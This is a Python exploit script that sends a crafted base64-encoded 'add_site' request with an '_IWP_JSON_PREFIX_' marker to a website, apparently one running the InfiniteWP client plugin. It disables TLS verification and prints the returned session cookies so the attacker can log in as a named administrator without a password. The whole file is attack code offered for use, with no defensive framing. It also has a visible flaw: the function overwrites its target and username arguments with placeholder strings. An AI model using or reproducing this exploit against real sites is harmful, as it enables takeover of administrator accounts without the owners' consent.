import requests
import json
import argparse
import base64
import json
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(site, username):
    site = "# TARGET IP (EXAMPLE HTTP://111.111.111.111/)"
    username = "# ADMIN NAME"
    json_info = {"iwp_action":"add_site","params":{"username": username}}
    try:
        return requests.post(site, timeout=5, verify=False,
            headers={"User-Agent" : "raphaelrocks"},
            data="_IWP_JSON_PREFIX_{}".format(base64.b64encode(json.dumps(json_info).encode("utf-8")).decode("utf-8"))
        )
    except Exception as e:
        print("[-] HTTP Exploit Error: {}".format(e))
    return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-n", "--username", dest="username", help="Username of admin, default is admin", default="admin")
    parser.add_argument("-u", "--url", dest="url", help="Root URL of Site")
    args = parser.parse_args()
    site_exploit = exploit(args.url, args.username)
    if site_exploit and site_exploit.status_code == requests.codes.ok:
        cookie_string = "; ".join([str(x)+"="+str(y) for x,y in site_exploit.cookies.items()])
        if cookie_string:
            print("[+] Use Cookies to Login: \n{}".format(cookie_string))
            exit(0)
    print("[-] Exploit Failed")
